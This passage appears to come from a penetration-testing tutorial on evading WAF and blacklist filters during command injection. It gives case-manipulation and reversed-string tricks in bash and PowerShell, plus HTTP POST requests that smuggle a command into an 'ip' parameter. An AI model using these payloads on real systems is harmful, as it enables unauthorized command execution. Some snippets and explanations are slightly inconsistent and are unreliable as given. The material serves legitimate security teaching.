In some instances, we may be dealing with advanced filtering solutions, like Web Application Firewalls (WAFs), and basic evasion techniques may not necessarily work. We can utilize more advanced techniques for such occasions, which make detecting the injected commands much less likely.
## Case Manipulation
One command obfuscation technique we can use is case manipulation, in which the character cases of a command is inverted (e.g `WHOAMI`) or alternated (e.g `WhOaMi`). This usually works because command blacklist functions may not check for different case variations of a single word, this is because Linux-based systems are case sensitive. So this technique will work for Windows' Powershell and CMD as they are case-insensitive.

Not all is lost for Linux-based systems and bash shell, we just have to be creative:
```nix
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```
The command above will convert the command into an all-lowercase word and execute it.

Additionally, for bash shell, the following technique will work as well:
```nix
$(a="WhOaMi";printf %s "${a,,}")
```
## Reversed Commands
Another technique is reversing commands, and having a command template that switches them back and executes the command. For example, instead of executing `whoami`, we will instead use `imaohw` to avoid triggering the blacklisted command.

But first, we have to get the reversed string of our command in our terminal:
```nix
echo 'whoami' | rev
```
Then we can execute the original command by reversing it back in a sub-shell:
```http
POST / HTTP/1.1
Host: target-website.com
...

ip=127.0.0.1%0d%0a$(rev<<<'imaohw')
```

The same can also be applied to Windows. First we reverse the string:
```powershell
"whoami"[-1...20] -join ''
```
Then we execute a reverse string using Powershell sub-shell (`iex "$()"`):
```http
POST / HTTP/1.1
Host: target-website.com
...

ip=127.0.0.1%0d%0aiex "$('imaohw'[-1..-20] -join '')"
```
> Note: We removed the encoding on the command so that we can read it properly. But during engagements, make sure to encode the necessary characters to bypass other filters.